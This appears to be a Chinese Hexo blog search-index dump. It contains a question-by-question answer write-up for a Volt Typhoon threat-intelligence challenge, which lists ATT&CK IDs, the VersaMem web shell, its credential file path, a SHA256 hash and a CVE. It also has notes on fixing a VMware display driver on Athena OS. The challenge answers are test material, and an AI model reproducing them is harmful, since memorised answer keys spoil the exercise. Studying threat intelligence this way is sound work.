您的安全团队必须始终掌握最新动态，并了解您所在行业中针对组织的威胁。当您以威胁情报实习生的身份开启您的职业生涯时，您已经具备了一些安全运营中心 (SOC) 经验，您的经理会给您分配一项任务，以测试您的研究技能以及您如何有效地利用 MITRE ATT&amp;CK 框架。* 对 Volt Typhoon 进行深入研究。* 使用 MITRE ATT&amp;CK 框架将攻击者的行为和策略转化为切实可行的洞察。用您的评估来打动您的经理，展现您对威胁情报的热情。 没有文件下载，全是Google信息收集 Task1Based on MITRE&#39;s sources, since when has Volt Typhoon been active? 根据 MITRE 的消息来源，Volt Typhoon 自何时开始活跃？ Google一下这个东东里面有一句话has been active since at least 2021，所以答案是Answer:2021 Task2MITRE identifies two OS credential dumping techniques used by Volt Typhoon. One is LSASS Memory access (T1003.001). What is the Attack ID for the other technique? MITRE 发现 Volt Typhoon 使用了两种操作系统凭据转储技术。一种是 LSASS 内存访问 (T1003.001)。另一种技术的攻击 ID 是什么？ 往下滑搜索dump可以看到Answer:T1003.003 Task3Which database is targeted by the credential dumping technique mentioned earlier? 前面提到的凭证转储技术针对的是哪个数据库？ 点进第二个可以看到Answer:Active Directory Task4Which registry hive is required by the threat actor to decrypt the targeted database? 威胁行为者需要哪个注册表配置单元来解密目标数据库？ 找注册表相关的Answer:SYSTEM Task5During the June 2024 campaign, an adversary was observed using a Zero-Day Exploitation targeting Versa Director. What is the name of the Software/Malware that was used? 在 2024 年 6 月的活动中，观察到对手使用针对 Versa Director 的零日漏洞利用。被使用的软件/恶意软件的名称是什么？ 回到Volt Typhoon，在里面找Versa Director开发了一个新的webshellAnswer:VersaMem Task6According to the Server Software Component, what type of malware was observed? 根据服务器软件组件，观察到什么类型的恶意软件？ 答案在上面Answer:web shell Task7Where did the malware store captured credentials? 恶意软件将捕获的凭据存储在哪里？ 点进VersaMem介绍可以看到Answer:/tmp/.temp.data Task8According to MITRE’s reference, a Lumen/Black Lotus Labs article(Taking The Crossroads: The Versa Director Zero-Day Exploitaiton.), what was the filename of the first malware version scanned on VirusTotal? 根据 MITRE 的参考，一篇 Lumen/Black Lotus Labs 的文章（Taking The Crossroads: The Versa Director Zero-Day Exploitaiton.），扫描的第一个恶意软件版本在 VirusTotal 上的文件名是什么？ 下滑可以找到文章链接Taking the Crossroads: The Versa Director Zero-Day Exploitation在文章中可以看到Answer:VersaTest.png Task9What is the SHA256 hash of the file? 文件的 SHA256 哈希值？ 有耐心再往下滑可以看到已经给了Answer:4bcedac20a75e8f8833f4725adfc87577c32990c3783bf6c743f14599a176c37 Task10According to VirusTotal, what is the file type of the malware? 根据 VirusTotal，这个恶意软件的文件类型是什么？ 可能他给的图不算太清楚，但也能看到可以直接在VirusTotal搜索上面的hashAnswer:jar Task11What is the &#39;Created by&#39; value in the file&#39;s Manifest according to VirusTotal? 根据 VirusTotal，文件 Manifest 中的&#39;创建者&#39;值是什么？ 在VirusTotal中detail下滑可以看到Answer:Apache Maven 3.6.0 Task12What is the CVE identifier associated with this malware and vulnerability? 与此恶意软件和漏洞相关的 CVE 标识符是什么？ CVE在文件旁边也有Answer:cve-2024-39717 Task13According to the CISA document(https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf) referenced by MITRE, what is the primary strategy Volt Typhoon uses for defense evasion? 根据 CISA 文档（ https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf ）被 MITRE 引用的内容，Volt Typhoon 使用的防御规避的主要策略是什么？ 翻文档（英文文档翻起来麻烦）第三页有一个名词living off the land 本地利用感兴趣可以看一下What Are Living off the Land (LOTL) Attacks?Answer:LOTL Task14In the CISA document, which file name is associated with the command potentially used to analyze logon patterns by Volt Typhoon? 在 CISA 文档中，哪个文件名与 Volt Typhoon 用于分析登录模式的命令相关？ 在附表中可以看到一个OBSERVED COMMANDS，在那里可以看到想要的Answer:C:\\users\\public\\documents\\user.dat Game Over题外话：还有兴趣可以看一下A Cyber Threat Intelligence Journey","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"Athena维修记录补档","slug":"Athena维修记录补档/Athena维修记录补档","date":"2025-06-19T13:59:04.959Z","updated":"2025-06-19T13:59:04.959Z","comments":true,"path":"2025/06/19/Athena维修记录补档/Athena维修记录补档/","permalink":"http://example.com/2025/06/19/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A3/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A3/","excerpt":"","text":"补档一下我上一篇的愚蠢，全程都是自己yy按照上一篇的操作最终还是会回归到Blackscreen，费了半天劲啥事也没干成 这一篇就踏踏实实的写一下我的过程吧，最终结果可能还是没修好，但是记录一下 正常安装完成reboot我好好去翻了一下官方的doc当我尝试F3之后仍然无法今进入tty，那就还是按照上一篇的办法进入tty尝试删除gnome-shell发现没有，那就按照他的安装一下Xorg的包 但是doc中提供的这些包名来自于Fedora 或 RHEL 系列发行版，arch上有他自己的 Fedora&#x2F;RHEL 包名 Arch Linux 对应包名 xorg-x11-server-Xorg xorg-server xorg-x11-server-Xwayland xorg-xwayland xorg-x11-drv-libinput xf86-input-libinput 当然也可以安装xorg完整的，不过我没有 1sudo pacman -S xorg-server xorg-xwayland xf86-input-libinput 安装完毕之后，有点不敢重启了哈哈哈 同志，大胆重启很好，还是blackscreen，再重启进入tty看一下日志吧 journalctl看报错还是x驱动的报错，那我直接先把他给挪出去 12345678910111213141516171819202122232425262728╰─&gt;[👾]~ $ sudo mv /usr/lib/xorg/modules/drivers/vmware_drv.so /root/sudo pacman -S xf86-video-vesa xf86-video-fbdevsudo systemctl restart sddm[sudo] xxx 的密码：警告：xf86-video-vesa-2.6.0-2 已经为最新 -- 重新安装正在解析依赖关系...正在查找软件包冲突...软件包 (2) xf86-video-fbdev-0.5.1-1 xf86-video-vesa-2.6.0-2下载大小： 0.01 MiB全部安装大小： 0.07 MiB净更新大小： 0.03 MiB:: 进行安装吗？ [Y/n] :: 正在获取软件包...... xf86-video-fbdev-0.5.1-1-x86_64 13.3 KiB 54.6 KiB/s 00:00 [####################################################################################] 100%(2/2) 正在检查密钥环里的密钥 [####################################################################################] 100%(2/2) 正在检查软件包完整性 [####################################################################################] 100%(2/2) 正在加载软件包文件 [####################################################################################] 100%(2/2) 正在检查文件冲突 [####################################################################################] 100%(2/2) 正在检查可用存储空间 [####################################################################################] 100%:: 正在处理软件包的变化...(1/2) 正在重新安装 xf86-video-vesa [####################################################################################] 100%(2/2) 正在安装 xf86-video-fbdev [####################################################################################] 100%:: 正在运行事务后钩子函数...(1/1) Arming ConditionNeedsUpdate... 然后又回到小窗户了 这可以说明是那个驱动的问题了吧 重新安装一下试试其实我感觉在set cyber role的过程之后还是会出现blackscreen不过先重新装一下驱动和open-vm-tools试试 ok，装过了，一碰就G，那个VMware_drv.so只要在那个文件夹里面就不得行。。。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"Athena维修记录补档二","slug":"Athena维修记录补档二/维修记录补档二","date":"2025-06-19T13:59:04.959Z","updated":"2025-06-19T13:59:04.959Z","comments":true,"path":"2025/06/19/Athena维修记录补档二/维修记录补档二/","permalink":"http://example.com/2025/06/19/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A3%E4%BA%8C/%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A3%E4%BA%8C/","excerpt":"","text":"Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 特大喜讯特大喜讯 特大喜讯我终于tmd修好了 如何修复目前保守治疗的办法是先正常进行Athena的安装然后grub修改进入ttysudo su 进入root用户安装openssh开启ssh服务systemctl start ssh然后在本地ssh连接(这样方便我们下载编译的) 然后我们找个文件夹，也可以创建一个然后下载xorg的VMware驱动解压缩编译安装一下 12345tar -xvf xf86-video-vmware-13.4.0.tar.xzcd xf86-video-vmware-13.4.0./configure $XORG_CONFIG &amp;&amp;makesudo make install 为了确保万无一失，再复制一下 1sudo cp src/.libs/vmware_drv.so /usr/local/lib/xorg/modules/drivers/ 然后 然后请大胆重启然后就可以愉快的使用Athena了","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"Athena维修记录","slug":"Athena维修记录/Athena维修记录","date":"2025-06-19T13:59:04.955Z","updated":"2025-06-19T13:59:04.955Z","comments":true,"path":"2025/06/19/Athena维修记录/Athena维修记录/","permalink":"http://example.com/2025/06/19/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95/","excerpt":"","text":"最近两天Athena坏了，排查来排查去发现可能是vmware的显卡驱动坏了顺便也总结一下之前无脑安装Athena的错误 无脑安装Athena在之前的文章中还用proxychains4去挂代理，实际上没什么用现在请在主机上的代理工具上开启tun模式，他会创建一个虚拟网卡，将流量都转发到这个上面，具体的在这里不详细讲了，可以Google一下. 开了tun模式之后再进行安装就可以了，这时候也不需要修改/etc/pacman.conf中的配置了，可以顺利的执行 123456789╰─&gt;[👾]~ $ sudo pacman-key --init╰─&gt;[👾]~ $ sudo pacman -Sy:: Synchronizing package databases... athena is up to date core is up to date extra is up to date multilib is up to date chaotic-aur 627.1 KiB 366 KiB/s 00:02 [#####################################################################################] 100% 正常安装到结束也不会出现什么问题 显卡驱动的问题这时候重要的问题来了 如果这时候重启，可能会出现我出现的问题——loading kernel之后就黑屏了，没有loading的详细信息，按什么键也不可以进去tty交互页面不信我们来重启一下看，还可以看到有一个小窗户 重启一下修改一下grub引导进入tty的交互页面进入到这个界面的时候按e进入grub命令行按👇方向键找到下图中的部分给他改一下删掉quiet，再结尾加上systemd.unit=multi-user.target nomodesetCtrl+x 然后他会loading这时候就会看到加载过程和tty交互的输入刚刚安装创建的用户名回车就可以登录进去了 这里如果自己想要排查的话建议开ssh，然后用ssh连上去，因为在虚拟机的这个交互不太方便 以防万一先装一下openssh 1234sudo pacman -S opensshsudo systemctl start sshsudo su #(没错可以直接切换到root)passwd xxx #你的用户名 然后在主机就可以ssh连上去排查了 display-manager但你查看display-manager状态的时候会看到 123456╰─&gt;[👾]~ $ sudo systemctl status display-manager○ sddm.service - Simple Desktop Display Manager Loaded: loaded (/usr/lib/systemd/system/sddm.service; enabled; preset: disabled) Active: inactive (dead) Docs: man:sddm(1) man:sddm.conf(5) 继续 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748╰─&gt;[👾]~ $ sudo journalctl -u sddm.service -n 505月 27 15:20:04 Athena systemd[1]: Started Simple Desktop Display Manager.5月 27 15:20:04 Athena sddm[610]: Initializing...5月 27 15:20:04 Athena sddm[610]: Starting...5月 27 15:20:04 Athena sddm[610]: Logind interface found5月 27 15:20:04 Athena sddm[610]: Adding new display...5月 27 15:20:04 Athena sddm[610]: Loaded empty theme configuration5月 27 15:20:04 Athena sddm[610]: Xauthority path: &quot;/run/sddm/xauth_oLQvgT&quot;5月 27 15:20:04 Athena sddm[610]: Using VT 25月 27 15:20:04 Athena sddm[610]: Display server starting...5月 27 15:20:04 Athena sddm[610]: Writing cookie to &quot;/run/sddm/xauth_oLQvgT&quot;5月 27 15:20:04 Athena sddm[610]: Running: /usr/bin/X -nolisten tcp -background none -seat seat0 vt2 -auth /run/sddm/xauth_oLQvgT -noreset -displayfd 165月 27 15:20:06 Athena systemd-coredump[648]: [🡕] Process 620 (Xorg) of user 0 dumped core. Stack trace of thread 620: #0 0x00007f20e31d974c n/a (libc.so.6 + 0x9774c) #1 0x00007f20e317fdc0 raise (libc.so.6 + 0x3ddc0) #2 0x00007f20e316757a abort (libc.so.6 + 0x2557a) #3 0x00005566d1994b3e OsAbort (/usr/lib/Xorg + 0x153b3e) #4 0x00005566d1996037 FatalError (/usr/lib/Xorg + 0x155037) #5 0x00005566d199cfd8 n/a (/usr/lib/Xorg + 0x15bfd8) #6 0x00007f20e317fef0 n/a (libc.so.6 + 0x3def0) #7 0x00007f20e32c7849 n/a (libc.so.6 + 0x185849) #8 0x00007f20e37b9694 n/a (vmware_drv.so + 0xb694) #9 0x00005566d18b5c4b AddScreen (/usr/lib/Xorg + 0x74c4b) #10 0x00005566d19ba15d InitOutput (/usr/lib/Xorg + 0x17915d) #11 0x00005566d1873c69 n/a (/usr/lib/Xorg + 0x32c69) #12 0x00007f20e31696b5 n/a (libc.so.6 + 0x276b5) #13 0x00007f20e3169769 __libc_start_main (libc.so.6 + 0x27769) #14 0x00005566d18752b5 _start (/usr/lib/Xorg + 0x342b5) ELF object binary architecture: AMD x86-645月 27 15:20:06 Athena sddm[610]: Failed to read display number from pipe5月 27 15:20:06 Athena sddm[610]: Display server stopping...5月 27 15:20:06 Athena sddm[610]: Attempt 1 starting the Display server on vt 2 failed5月 27 15:20:08 Athena sddm[610]: Display server starting...5月 27 15:20:08 Athena sddm[610]: Writing cookie to &quot;/run/sddm/xauth_oLQvgT&quot;。。。。。。。。。5月 27 15:20:14 Athena sddm[610]: Failed to read display number from pipe5月 27 15:20:14 Athena sddm[610]: Display server stopping...5月 27 15:20:14 Athena sddm[610]: Attempt 3 starting the Display server on vt 2 failed5月 27 15:20:14 Athena sddm[610]: Could not start Display server on vt 25月 27 15:22:04 Athena sddm[610]: Signal received: SIGTERM5月 27 15:22:04 Athena systemd[1]: Stopping Simple Desktop Display Manager...5月 27 15:22:04 Athena systemd[1]: sddm.service: Deactivated successfully.5月 27 15:22:04 Athena systemd[1]: Stopped Simple Desktop Display Manager.5月 27 15:22:04 Athena systemd[1]: sddm.service: Consumed 5.537s CPU time, 17.1M memory peak. 这里测试一下Xorg能不能单独运行 12345678╰─&gt;[👾]~ $ startxxauth: file /home/xxx/.Xauthority does not existxauth: file /home/xxx/.Xauthority does not exist^C^C/usr/lib/Xorg.wrap: Only console users are allowed to run the X serverxinit: giving upxinit: unable to connect to X server: Connection refusedxinit: server error 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748╰─&gt;[👾]~ $ sudo Xorg -retroX.Org X Server 1.21.1.16X Protocol Version 11, Revision 0Current Operating System: Linux Athena 6.14.7-arch2-1 #1 SMP PREEMPT_DYNAMIC Thu, 22 May 2025 05:37:49 +0000 x86_64Kernel command line: BOOT_IMAGE=/vmlinuz-linux root=UUID=35dfce14-7d79-45a1-bee0-4081dfa4543a rw rootflags=subvol=@ loglevel=3 audit=0 nvme_load=yes zswap.enabled=0 fbcon=nodefer nowatchdog systemd.unit=multi-user.target nomodeset Current version of pixman: 0.46.0 Before reporting problems, check http://wiki.x.org to make sure that you have the latest version.Markers: (--) probed, (**) from config file, (==) default setting, (++) from command line, (!!) notice, (II) informational, (WW) warning, (EE) error, (NI) not implemented, (??) unknown.(==) Log file: &quot;/var/log/Xorg.0.log&quot;, Time: Tue May 27 16:25:42 2025(==) Using config directory: &quot;/etc/X11/xorg.conf.d&quot;(==) Using system config directory &quot;/usr/share/X11/xorg.conf.d&quot;(EE) (EE) Backtrace:(EE) unw_get_proc_name failed: no unwind info found [-10](EE) 0: /usr/lib/Xorg (?+0x0) [0x55d9c137ef7c](EE) unw_get_proc_name failed: no unwind info found [-10](EE) 1: /usr/lib/libc.so.6 (?+0x0) [0x7f1d01ad7ef0](EE) unw_get_proc_name failed: no unwind info found [-10](EE) 2: /usr/lib/libc.so.6 (?+0x0) [0x7f1d01c1f849](EE) unw_get_proc_name failed: no unwind info found [-10](EE) 3: /usr/lib/xorg/modules/drivers/vmware_drv.so (?+0x0) [0x7f1d02111694](EE) 4: /usr/lib/Xorg (AddScreen+0x11b) [0x55d9c1297c4b](EE) 5: /usr/lib/Xorg (InitOutput+0x3bd) [0x55d9c139c15d](EE) unw_get_proc_name failed: no unwind info found [-10](EE) 6: /usr/lib/Xorg (?+0x0) [0x55d9c1255c69](EE) unw_get_proc_name failed: no unwind info found [-10](EE) 7: /usr/lib/libc.so.6 (?+0x0) [0x7f1d01ac16b5](EE) 8: /usr/lib/libc.so.6 (__libc_start_main+0x89) [0x7f1d01ac1769](EE) 9: /usr/lib/Xorg (_start+0x25) [0x55d9c12572b5](EE) (EE) Segmentation fault at address 0x0(EE) Fatal server error:(EE) Caught signal 11 (Segmentation fault). Server aborting(EE) (EE) Please consult the The X.Org Foundation support at http://wiki.x.org for help. (EE) Please also check the log file at &quot;/var/log/Xorg.0.log&quot; for additional information.(EE) (EE) Server terminated with error (1). Closing log file.已中止 真是tmd事多呀 看下显卡 123456╰─&gt;[👾]~ $ lspci -k | grep -EA3 &#x27;(VGA|3D)&#x27;00:0f.0 VGA compatible controller: VMware SVGA II Adapter Subsystem: VMware SVGA II Adapter Kernel modules: vmwgfx00:10.0 SCSI storage controller: Broadcom / LSI 53c1030 PCI-X Fusion-MPT Dual Ultra320 SCSI (rev 01) Subsystem: VMware LSI Logic Parallel SCSI Controller (emulated) 从上面的sddm日志里看，Xorg 在加载 vmware_drv.so 时又崩溃了（Segfault），导致 SDDM 一直重试启动 Xorg 也失败。 如果想进入图形化界面，可以绕过出现问题的VMware驱动，改用内核自带的modesetting驱动（来自gpt） 12345678910111213141516171819202122232425# 1. 安装备用驱动包# 确保已经安装了 fbdev/vesa 作为备胎（虽然真正启用的是 modesetting）：sudo pacman -S xf86-video-fbdev xf86-video-vesa# 2. 删除可能残留的 VMware X 驱动配置# 把任何强制加载 vmware_drv 的配置都删掉：sudo rm -f /etc/X11/xorg.conf.d/20-vmware.conf \\ /usr/share/X11/xorg.conf.d/20-vmware.conf# 3. 强制让 Xorg 只用 modesetting# 在 /etc/X11/xorg.conf.d/ 下新建一个配置文件：sudo mkdir -p /etc/X11/xorg.conf.dsudo tee /etc/X11/xorg.conf.d/10-modesetting.conf &gt; /dev/null &lt;&lt; &#x27;EOF&#x27;Section &quot;Device&quot; Identifier &quot;PrimaryGPU&quot; Driver &quot;modesetting&quot;EndSectionEOF# 这会告诉 Xorg 不再尝试加载 vmware 驱动，而直接使用内核的 KMS modesetting。# 4. 重启并验证# 重新启动 SDDM：sudo systemctl restart sddm 然后就会看到图形化界面但是小巧可爱 修复保险起见，我先把Athena挂起，然后修复一下vmware没有作用的话就是个心里安慰吧 重启之后打开Athena，重新安装一下VMware的X驱动看会不会报错 12345678910╰─&gt;[👾]~ $ sudo pacman -Syu xf86-video-vmware open-vm-tools open-vm-tools-desktop:: 正在同步软件包数据库... athena 已经是最新版本 core 已经是最新版本 extra 已经是最新版本 multilib 已经是最新版本 chaotic-aur 已经是最新版本警告：xf86-video-vmware-13.4.0-4 已经为最新 -- 重新安装警告：open-vm-tools-6:12.5.2-2 已经为最新 -- 重新安装错误：未找到目标：open-vm-tools-desktop 重新装一下open-vm-tools，我是参考arch linux cn中给的办法进行的 12345678910sudo pacman -S open-vm-tools# 在内核中加上驱动程序sudo vim /etc/mkinitcpio.confMODULES=(... vmw_balloon vmw_pvscsi vsock vmw_vsock_vmci_transport ...)# 一般是在上面esc :wqsudo systemctl start vmtoolsd.service vmware-vmblock-fuse.service 然后大胆重启 成功修好了，但是总感觉不对你知道吧，就是这应该是进行aegis-tui之后的，但是修复进去完全没看到他的影子。。。大不了再进行一下试试 试过了，可以正常使用了，该下啥下啥吧","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"Hello World","slug":"hello-world","date":"2025-06-13T09:07:53.299Z","updated":"2025-06-13T09:07:53.299Z","comments":true,"path":"2025/06/13/hello-world/","permalink":"http://example.com/2025/06/13/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"random","slug":"random","permalink":"http://example.com/tags/random/"},{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]}